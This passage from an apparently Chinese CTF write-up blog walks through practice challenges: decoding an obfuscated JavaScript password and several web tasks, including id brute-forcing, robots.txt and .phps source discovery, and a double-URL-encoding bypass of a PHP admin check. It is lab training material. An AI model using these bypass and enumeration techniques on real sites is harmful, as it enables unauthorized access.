class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们看到开头一大串代码先不着急，挨个分析</p>
<p>最显眼的就是这串16进制码</p>
<p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p>
<p>我们可以先用python 直接输出，得到10进制</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220624223640446.png"><img src="/wp-Gongfang/image-20220624223640446.png" alt="image-20220624223640446"></a></p>
<p>这里我们把这串10进制数按ascii码转化为字符串</p>
<p>786OsErtk12</p>
<p>按描述填写 </p>
<p>得到flag : Cyberpeace{786OsErtk12}</p>
<hr>
<p>我对代码审计还不太熟悉，下面引用一篇大佬的代码审计</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">执行流程：</span><br><span class="line">一、首先定义了一个<span class="variable">dechiffre</span>函数，咱先不管，因为还没有调用</span><br><span class="line">注：先将\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>十六进制数转换成字符串，<span class="variable">python</span>下<span class="variable">print</span>即可，或网址：<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">输出结果<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">二、执行<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">三、调用了<span class="variable">dechiffre</span>，执行<span class="variable">dechiffre</span>函数</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)先将<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>带入<span class="variable">dechiffre</span>函数执行，即<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)接着我们看到了<span class="variable">pass</span>变量，暂时先放着</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)因为<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">将<span class="variable">pass_enc</span>字符串分割成字符串数组，赋值给<span class="variable">tab</span>参数，所以：</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   注：<span class="variable">tab</span>此时是字符串数组！！！</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)随后也对<span class="variable">pass</span>分割</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)变量赋值代码分析：<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">一开始<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,没有赋值，为<span class="variable">undefined</span>，其它参数<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>，<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>，后来<span class="variable">i</span>被赋值<span class="operator">=</span><span class="number">0</span>，<span class="variable">j</span>被赋值为<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)第九行此时<span class="variable">n</span>被赋值为<span class="number">0</span>，所以<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>，最后等于<span class="number">11</span>    注：这里的(<span class="variable">l</span>)其中是英文字母<span class="variable">l</span>，不是数字<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)第十行中，<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)第一个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">解释：前面的<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]是无用的，因为后面会被<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]的值重新覆盖</span><br><span class="line">第一次循环：<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>英文字母<span class="variable">F</span></span><br><span class="line">第二次<span class="operator">...</span></span><br><span class="line">第三次<span class="operator">...</span></span><br><span class="line">第四次<span class="operator">...</span></span><br><span class="line">第五次<span class="operator">...</span></span><br><span class="line">所以，这个<span class="keyword">for</span>循环，最后的<span class="variable">p</span>为（尽管没有输出出来，这里我们知道就好）<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)第二个<span class="keyword">for</span>循环，精简一下代码：</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">解释：这里的<span class="keyword">for</span>循环和上面的差不多，注意这里的<span class="variable">p</span>值由于第一次<span class="keyword">for</span>循环执行后现在已经是<span class="variable">FAUX</span> <span class="variable">P</span>了</span><br><span class="line">加上第一次<span class="keyword">for</span>循环的<span class="variable">p</span>值，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">因为<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">所以：<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">因此，最后的<span class="variable">p</span>为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> 即 <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> 最后函数输出为<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">嗯哼？？？这个函数就执行完了？？？我的<span class="variable">tab</span>数组怎么没有用到？？？，我一开始带进来的参数呢？去哪了？别想了，输出值虽然用到了带进来的参数(就是分割后的<span class="variable">tab</span>数组)，但是<span class="keyword">for</span>循环那里人家直接使用<span class="variable">tab2</span>数组相关代码的值，根本没有用到<span class="variable">tab</span>数组的值，所以由于代码逻辑问题，你传入的<span class="variable">dechiffre</span>的参数<span class="variable">pass_enc</span>是没有任何意义的</span><br><span class="line"></span><br><span class="line">三、<span class="variable">dechiffre</span>函数执行完成后，继续执行其它的代码</span><br><span class="line"><span class="variable">h</span> <span class="operator">=</span> <span class="variable">window</span>.<span class="property">prompt</span>(&#x27;<span class="title class_">Enter</span> <span class="variable">password</span>&#x27;);</span><br><span class="line">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(<span class="variable">h</span>) );</span><br><span class="line"><span class="variable">h</span><span class="operator">=</span>你输入弹框内的内容</span><br><span class="line">之后<span class="variable">alert</span>弹出<span class="title function_">dechiffre</span>(<span class="variable">h</span>)的值，由前面所有的代码可知，代码里<span class="variable">p</span>的值与<span class="variable">tab</span>无关，因为最终都会被<span class="variable">tab2</span>的值替代，所以我们无论输入什么，也就是<span class="variable">pass_enc</span><span class="operator">=</span><span class="variable">h</span>，无论输入的这个<span class="variable">h</span>等于什么，不管<span class="variable">tab</span>能否被分割成字符串数组，是否存在，都只会利用到<span class="variable">tab2</span>。通俗点讲，有关<span class="variable">tab</span>的参数与值都可以视为没有，因此，<span class="variable">pass_enc</span>参数是什么也就没有意义了</span><br><span class="line"></span><br><span class="line">四、最后，结论就是，无论我们在弹框中输入什么值，都只会返回<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line">我就猜想，会不会<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;<span class="char escape_">\x35</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x37</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x35</span>\x2c<span class="char escape_">\x36</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x34</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x31</span><span class="char escape_">\x36</span>\x2c<span class="char escape_">\x31</span><span class="char escape_">\x30</span><span class="char escape_">\x37</span>\x2c<span class="char escape_">\x34</span><span class="char escape_">\x39</span>\x2c<span class="char escape_">\x35</span><span class="char escape_">\x30</span>&quot;</span>));这个语法错误，并且没有没计算出来的是不是最后正确的值，也就是<span class="variable">flag</span><span class="operator">~</span></span><br><span class="line">于是，我不用它这么无论<span class="variable">pass_enc</span>参数输入什么都显示<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>的函数，咱也抛弃它一回，自己重新写代码执行它</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">!</span><span class="variable">DOCTYPE</span> <span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">meta</span> <span class="variable">charset</span><span class="operator">=</span><span class="string">&quot;utf-8&quot;</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">head</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">n</span><span class="operator">=</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>);</span><br><span class="line">    <span class="variable">document</span>.<span class="property">write</span>(<span class="variable">n</span>);</span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">script</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">body</span><span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>/<span class="variable">html</span><span class="operator">&gt;</span></span><br><span class="line">最后结果为：<span class="number">786</span>OsErtk12</span><br><span class="line">根据提示的<span class="variable">flag</span>格式输入最后的<span class="variable">flag</span>！</span><br></pre></td></tr></table></figure>

<p>注：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="built_in">split</span>() 方法用于把一个字符串分割成字符串数组</span><br><span class="line">语法：<span class="built_in">string</span>.<span class="built_in">split</span>(separator,<span class="built_in">limit</span>)</span><br><span class="line">参数                 描述</span><br><span class="line">separator        可选。字符串或正则表达式，从该参数指定的地方分割 <span class="built_in">string</span> Object。比如此题以逗号分割成字符串数组</span><br><span class="line"><span class="built_in">limit</span>            可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度。</span><br><span class="line">举例：str=<span class="string">&quot;a,b,c,d,e,f,g&quot;</span>;</span><br><span class="line"><span class="built_in">var</span> 1st = str.<span class="built_in">split</span>(<span class="string">&quot;,&quot;</span>,<span class="number">3</span>);   对str以逗号进行分割，分割后的字符串数组内的值最多只能有<span class="number">3</span>个，结果就是1st = [a,b,c]</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)<span class="keyword">for</span> 循环的语法如下：</span><br><span class="line"><span class="keyword">for</span> (语句 <span class="number">1</span>; 语句 <span class="number">2</span>; 语句 <span class="number">3</span>) &#123;</span><br><span class="line">     要执行的代码块</span><br><span class="line">&#125;</span><br><span class="line">语句 <span class="number">1</span> 在循环（代码块）开始之前执行。</span><br><span class="line">语句 <span class="number">2</span> 定义运行循环（代码块）的条件。</span><br><span class="line">语句 <span class="number">3</span> 会在循环（代码块）每次被执行后执行。</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span><br><span class="line">语法：String.fromCharCode(n1, n2, ..., nX)</span><br><span class="line">参数                 描述</span><br><span class="line">n1, n2, ..., nX     必需。一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)<span class="built_in">prompt</span>()方法用于显示可提示用户进行输入的对话框。</span><br><span class="line">这个方法返回用户输入的字符串</span><br><span class="line">语法：<span class="built_in">prompt</span>(msg,defaultText)</span><br><span class="line">参数                描述</span><br><span class="line">msg                可选。要在对话框中显示的纯文本（而不是 HTML 格式的文本）就是弹框显示文本。</span><br><span class="line">defaultText        可选。默认的输入文本，你输入什么弹框一开始出现里面的输入框就会默认显示你这个文本。</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)<span class="built_in">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span><br><span class="line">这个表示声明变量i,j,k,l,m,n,o,p，只有l和p两个变量被赋值了，其它的变量都是不带值的，不带有值的变量，它的值将是undefined，后续代码中可以给它赋值。</span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)<span class="built_in">length</span></span><br><span class="line"><span class="built_in">length</span> 属性可设置或返回数组中元素的数目。</span><br></pre></td></tr></table></figure>

<h1 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h1><h2 id="1-baby-web"><a href="#1-baby-web" class="headerlink" title="1.baby_web"></a>1.baby_web</h2><h3 id="1-题目描述-11"><a href="#1-题目描述-11" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>想想初始页面是哪个</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p> 开始界面如下</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220625162533345.png"><img src="/wp-Gongfang/image-20220625162533345.png" alt="image-20220625162533345"></a></p>
<p>没有头绪，但是描述里有首页，再根据url知道这是个php网站</p>
<p>php网站首页文件就是index.php</p>
<p><code>index.php文件是一个php网站首页文件，index是普遍意义上的“首页”，也就是你输入一个域名后会打开一个页面，基本上就是index.xxxx（基本上首页都不会把index.xxxx显示在url里，但也不绝对）</code></p>
<p>试试<code>111.200.241.244:59074/index.php</code></p>
<p>结果又会到1.php，url又变成<code>111.200.241.244:59074/1.php</code></p>
<p>F12打开查看网络</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220625171731934.png"><img src="/wp-Gongfang/image-20220625171731934.png" alt="image-20220625171731934"></a></p>
<p><code>补充：</code></p>
<p> <code>index.php的状态是302什么意思？</code></p>
<p><code>302 Found，原始描述短语为 Moved Temporarily(临时搬家） ，是[HTTP协议](https://baike.baidu.com/item/HTTP协议)中的一个状态码(Status Code)。可以简单的理解为该资源原本确实存在，但已经被**临时**改变了位置；换而言之，就是请求的资源暂时驻留在不同的URI下，故而除非特别指定了缓存头部指示，该状态码不可缓存。</code></p>
<p>发现确实是跳转到了index.php但为什么又回到1.php</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220625171819943.png"><img src="/wp-Gongfang/image-20220625171819943.png" alt="image-20220625171819943"></a></p>
<p>可以看到location:1.php，这就是为什么无法直接访问index.php的原因，但flag已经得到</p>
<p>得到flag</p>
<hr>
<p>如果用burpsuite查看<code>111.200.241.244:59074/index.php</code>，只能看到Flag is hidden!，也算是提示</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220625172122211.png"><img src="/wp-Gongfang/image-20220625172122211.png" alt="image-20220625172122211"></a></p>
<h2 id="2-ics-06"><a href="#2-ics-06" class="headerlink" title="2.ics-06"></a>2.ics-06</h2><h3 id="1-题目描述-12"><a href="#1-题目描述-12" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
<h3 id="2-wp-10"><a href="#2-wp-10" class="headerlink" title="2)wp"></a>2)wp</h3><p>打开界面有些吓人</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626084029917.png"><img src="/wp-Gongfang/image-20220626084029917.png" alt="image-20220626084029917"></a></p>
<p>但只有报表中心能打开</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626084102777.png"><img src="/wp-Gongfang/image-20220626084102777.png" alt="image-20220626084102777"></a></p>
<p>看到url就有思路了，我们可以尝试id爆破</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626084318243.png"><img src="/wp-Gongfang/image-20220626084318243.png" alt="image-20220626084318243"></a></p>
<p>利用Numbers方式，从1到5000，发现2333处成功爆破</p>
<p>得到flag</p>
<h2 id="3-Training-WWW-Robots"><a href="#3-Training-WWW-Robots" class="headerlink" title="3.Training-WWW-Robots"></a>3.Training-WWW-Robots</h2><h3 id="1-题目描述-13"><a href="#1-题目描述-13" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-11"><a href="#2-wp-11" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题和上面新手区的题类似</p>
<p>先访问<code>http://111.200.241.244:51820/robots.txt</code>得到php文件名</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626090904204.png"><img src="/wp-Gongfang/image-20220626090904204.png" alt="image-20220626090904204"></a></p>
<p>于是访问<code>http://111.200.241.244:51820/fl0g.php/robots.txt</code></p>
<p>得到flag</p>
<h2 id="4-PHP2"><a href="#4-PHP2" class="headerlink" title="4.PHP2"></a>4.PHP2</h2><h3 id="1-题目描述-14"><a href="#1-题目描述-14" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-12"><a href="#2-wp-12" class="headerlink" title="2)wp"></a>2)wp</h3><p>这句话的意思是”你能证明这个网站存在吗“</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626104943938.png"><img src="/wp-Gongfang/image-20220626104943938.png" alt="image-20220626104943938"></a></p>
<p>没有思路，抓包，和御剑、dirsearch都没又得到想要的结果</p>
<p>没有办法，搜了一下大佬们的wp</p>
<p>了解到了一个新的知识点phps</p>
<p><code>phps即为PHP Source：phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。</code></p>
<p>访问<code>http://111.200.241.244:51703/index.phps</code>，得到源码内容</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626105416606.png"><img src="/wp-Gongfang/image-20220626105416606.png" alt="image-20220626105416606"></a></p>
<p>右键查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>

<p>根据代码知道，当id&#x3D;admin，输出not allowed!，但是想要输出flag</p>
<p>就需要注意这句语句<code>$_GET[id] = urldecode($_GET[id]);</code></p>
<p><code>urldecode:本函数对字符串进行URL解码。例如通过urlencode编码后的字符串，可通过UrlDecode进行解码。对Url路径加码的函数是UrlEncode  用法相反，和UrlDecode是一致对应的</code></p>
<p>这里我们就清楚了，需要把admin进行url编码，但是只对其进行一次编码，要知道网站本身对url编码就有解码的能力，也就是在urldecode函数执行之前，网站已经把编码解码为admin，从而只输出not allowed!</p>
<p>所以，这里需要对admin进行两次编码，第一被网站解码，绕过第一个if，然后在urldecode函数里进行第二次解码，变成admin，从而输出Key(flag)</p>
<p>于是访问<code>http://111.200.241.244:51703/index.php?id=%25%36%31dmin</code></p>
<p>这里的%25%36%31是字母a的二次url编码由a第一次编码结果%61再次编码而成</p>
<p>–为了payload简洁，一般只编码一个字母</p>
<p><a data-fancybox="gallery" data-src="/wp-Gongfang/image-20220626110642311.png"><img src="/wp-Gongfang/image-20220626110642311.png" alt="image-20220626110642311"></a></p>
<p>得到flag</p>
<h2 id="5-Web-python-template-injection"><a href="#5-Web-python-template-injection" class="headerlink" title="5.Web_python_template_injection"></a>5.Web_python_template_injection</h2><p>该题属于ssti，建议先了解一些<a href="../../../../2022/05/28/Web-study">ssti</a>的模板注入，和这两篇文章了解一些flask运行原理</p>
<p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a>  </p>
<p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
<p>然后再做这道题</p>
<p><a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">大佬wp</a></p>
<h2 id="6-Web-php-unserialize"><a href="#6-Web-php-unserialize" class="headerlink" title="6.Web_php_unserialize"></a>6.Web_php_unserialize</h2><h3 id="1-题目描述-15"><a href="#1-题目描述-15" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-13"><a href="#2-wp-13" class="headerlink" title="2)wp"></a>2)wp</h3><p>看名字可知，这是道<a href="../../../../2022/05/28/Web-study">php反序列化</a>类型的题</p>
<p>开始先分析一下php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 